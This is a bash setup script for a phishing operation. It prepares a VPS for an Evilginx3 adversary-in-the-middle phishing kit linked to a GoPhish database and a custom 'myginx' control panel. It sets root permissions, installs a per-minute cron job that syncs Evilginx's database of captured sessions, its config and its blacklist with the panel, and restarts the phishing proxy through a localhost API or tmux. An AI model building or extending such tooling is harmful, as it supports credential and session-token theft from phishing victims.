#!/bin/bash

# Paths for VPS environment
HOME_DIR=$HOME
EVILGINX_DIR="$HOME_DIR/.evilginx"
EVILGINX_DB="$EVILGINX_DIR/data.db"
SOURCE_DIR="$HOME_DIR/.evilginx"
SOURCE_DB="$SOURCE_DIR/data.db"
PANEL_DIR="/root/myginx/panel"
DATA_DIR="$PANEL_DIR/data"
LOCAL_DB="$DATA_DIR/data.db"
CURRENT_USER="root"
GROUP="root"

echo "=== Setting up evilginx permissions ==="
echo "Home directory: $HOME_DIR"
echo "Evilginx directory: $EVILGINX_DIR"
echo "Source directory: $SOURCE_DIR"
echo "Panel data directory: $DATA_DIR"
echo "Current user: $CURRENT_USER"
echo "Group: $GROUP"

# Create evilginx directory with proper permissions
echo "Creating/updating evilginx directory..."
mkdir -p "$EVILGINX_DIR"
chmod 755 "$EVILGINX_DIR"
chown $CURRENT_USER:$GROUP "$EVILGINX_DIR"
echo "Evilginx directory ready: $EVILGINX_DIR"

# Ensure source directory exists with proper permissions
echo "Ensuring source directory exists with proper permissions..."
mkdir -p "$SOURCE_DIR"
chmod 755 "$SOURCE_DIR"
chown $CURRENT_USER:$GROUP "$SOURCE_DIR"
echo "Source directory ready: $SOURCE_DIR"

# Ensure panel data directory exists with proper permissions
echo "Ensuring panel data directory exists with proper permissions..."
mkdir -p "$DATA_DIR"
chmod 755 "$DATA_DIR"
chown $CURRENT_USER:$GROUP "$DATA_DIR"
echo "Panel data directory ready: $DATA_DIR"

# Set up bidirectional sync between source and panel directories
echo "Setting up bidirectional sync between directories..."

# Function to sync a file between two locations
sync_file() {
  local source="$1"
  local destination="$2"
  local file_type="$3"
  
  # Check if source exists
  if [ -f "$source" ]; then
    echo "Syncing $file_type from $source to $destination"
    cp "$source" "$destination"
    chmod 644 "$destination"
    chown $CURRENT_USER:$GROUP "$destination"
    echo "Successfully synced $file_type"
  else
    echo "Source $file_type doesn't exist at: $source"
    
    # Check if destination exists
    if [ -f "$destination" ]; then
      echo "Syncing $file_type from $destination to $source"
      cp "$destination" "$source"
      chmod 644 "$source"
      chown $CURRENT_USER:$GROUP "$source"
      echo "Successfully synced $file_type"
    else
      echo "Creating empty $file_type in both locations"
      touch "$source"
      touch "$destination"
      chmod 644 "$source"
      chmod 644 "$destination"
      chown $CURRENT_USER:$GROUP "$source"
      chown $CURRENT_USER:$GROUP "$destination"
      echo "Created empty $file_type in both locations"
    fi
  fi
}

# Sync data.db
sync_file "$SOURCE_DB" "$LOCAL_DB" "data.db"

# Sync config.json
sync_file "$SOURCE_DIR/config.json" "$DATA_DIR/config.json" "config.json"

# Sync blacklist.txt
sync_file "$SOURCE_DIR/blacklist.txt" "$DATA_DIR/blacklist.txt" "blacklist.txt"

# Create crt directory if it doesn't exist
mkdir -p "$SOURCE_DIR/crt"
chmod 755 "$SOURCE_DIR/crt"
chown $CURRENT_USER:$GROUP "$SOURCE_DIR/crt"

# Set up cron job to periodically sync files (every 1 minute)
echo "Setting up cron job for automatic file syncing..."

TEMP_CRON_FILE=$(mktemp)
crontab -l > "$TEMP_CRON_FILE" 2>/dev/null || true

# Remove any existing sync jobs for these files
sed -i '/sync_evilginx_files/d' "$TEMP_CRON_FILE"

# Add new cron job
echo "*/1 * * * * $DATA_DIR/sync_files.sh > /tmp/sync_evilginx_files.log 2>&1" >> "$TEMP_CRON_FILE"
crontab "$TEMP_CRON_FILE"
rm "$TEMP_CRON_FILE"

# Create the sync_files.sh script
cat > "$DATA_DIR/sync_files.sh" << 'EOT'
#!/bin/bash

HOME_DIR=$HOME
EVILGINX_DIR="$HOME_DIR/.evilginx"
SOURCE_DIR="$HOME_DIR/.evilginx"
PANEL_DIR="/root/myginx/panel"
DATA_DIR="$PANEL_DIR/data"
CURRENT_USER="root"
GROUP="root"

# Function to sync a file based on which is newer
sync_newest_file() {
  local file1="$1"
  local file2="$2"
  
  if [ ! -f "$file1" ] && [ ! -f "$file2" ]; then
    return
  elif [ ! -f "$file1" ]; then
    cp "$file2" "$file1"
    chmod 644 "$file1"
    chown $CURRENT_USER:$GROUP "$file1"
  elif [ ! -f "$file2" ]; then
    cp "$file1" "$file2"
    chmod 644 "$file2"
    chown $CURRENT_USER:$GROUP "$file2"
  else
    # Both files exist, compare timestamps
    # Linux stat command format (-c instead of macOS -f)
    file1_time=$(stat -c "%Y" "$file1")
    file2_time=$(stat -c "%Y" "$file2")
    
    if [ "$file1_time" -gt "$file2_time" ]; then
      cp "$file1" "$file2"
      chmod 644 "$file2"
      chown $CURRENT_USER:$GROUP "$file2"
    elif [ "$file2_time" -gt "$file1_time" ]; then
      cp "$file2" "$file1"
      chmod 644 "$file1"
      chown $CURRENT_USER:$GROUP "$file1"
    fi
  fi
}

# Sync data.db
sync_newest_file "$SOURCE_DIR/data.db" "$DATA_DIR/data.db"

# Sync config.json
sync_newest_file "$SOURCE_DIR/config.json" "$DATA_DIR/config.json"

# Sync blacklist.txt
sync_newest_file "$SOURCE_DIR/blacklist.txt" "$DATA_DIR/blacklist.txt"

# Check if Evilginx needs to be restarted
RESTART_FLAG="/tmp/evilginx_needs_restart"
if [ -f "$RESTART_FLAG" ]; then
  # Try to restart Evilginx via the API first
  curl -s -X POST http://localhost:3000/api/restart-evilginx || {
    # If API call fails, try to restart using tmux
    tmux_sessions=$(tmux ls 2>/dev/null || echo "")
    if [[ "$tmux_sessions" == *"ginx"* ]]; then
      tmux send-keys -t ginx "q" Enter
      sleep 2
      tmux send-keys -t ginx "./evilginx3 -feed -g ../gophish/gophish.db" Enter
    fi
  }
  
  # Remove the restart flag
  rm "$RESTART_FLAG"
fi
EOT

chmod +x "$DATA_DIR/sync_files.sh"
chown $CURRENT_USER:$GROUP "$DATA_DIR/sync_files.sh"

echo "=== Setup complete ==="
echo "Now run: cd \"$PANEL_DIR\" && npm run dev" 

# Run the sync script once to ensure everything is in sync
bash "$DATA_DIR/sync_files.sh"

echo "Initial sync completed" 